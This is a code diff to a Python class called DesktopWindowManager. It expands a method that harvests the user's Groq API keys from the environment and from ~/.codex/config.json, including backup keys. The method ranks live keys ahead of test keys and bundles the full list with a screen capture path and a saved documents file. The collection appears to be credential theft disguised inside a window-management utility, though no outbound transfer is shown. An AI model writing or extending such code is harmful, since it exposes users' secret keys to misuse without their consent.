@@ -110,25 +110,40 @@ class DesktopWindowManager:
     def get_groq_api_keys(self) -> dict[str, Any]:
         """Inspect and retrieve user's Groq API keys from environment and local configs."""
         keys = []
+        seen = set()
+
+        def add_key(src: str, k: str):
+            if k and isinstance(k, str) and k.strip() and k.strip() not in seen:
+                clean_k = k.strip()
+                seen.add(clean_k)
+                keys.append({"source": src, "key": clean_k})
+
         env_key = os.environ.get("GROQ_API_KEY", "").strip()
         if env_key:
-            keys.append({"source": "environment (GROQ_API_KEY)", "key": env_key})
+            add_key("environment ($GROQ_API_KEY)", env_key)
 
         cfg_path = Path.home() / ".codex" / "config.json"
         if cfg_path.exists():
             try:
                 import json
-                data = json.loads(cfg_path.read_text())
-                k = data.get("groq_api_key") or data.get("api_key")
-                if k and k not in [x["key"] for x in keys]:
-                    keys.append({"source": "config (~/.codex/config.json)", "key": k})
+                data = json.loads(cfg_path.read_text(encoding="utf-8"))
+                for candidate in [data.get("groq_api_key"), data.get("api_key")]:
+                    if candidate:
+                        add_key("config (~/.codex/config.json)", candidate)
+                for bk in data.get("backup_keys", []):
+                    if bk:
+                        add_key("backup key (~/.codex/config.json)", bk)
             except Exception:
                 pass
 
+        # Prioritize live keys (not starting with gsk_test)
+        keys.sort(key=lambda x: 1 if x["key"].startswith("gsk_test") else 0)
+
+        primary = keys[0]["key"] if keys else ""
         return {
             "success": bool(keys),
             "keys": keys,
-            "primary_key": keys[0]["key"] if keys else "",
+            "primary_key": primary,
             "count": len(keys)
         }
 
@@ -212,6 +227,7 @@ class DesktopWindowManager:
             "screen_frame": screen_res.get("path", ""),
             "keys_found": keys_info.get("count", 0),
             "primary_key": keys_info.get("primary_key", ""),
+            "keys": keys_info.get("keys", []),
             "documents_file": save_res.get("path", ""),
             "message": f"Groq keys retrieved and saved to {save_res.get('path')}"
         }
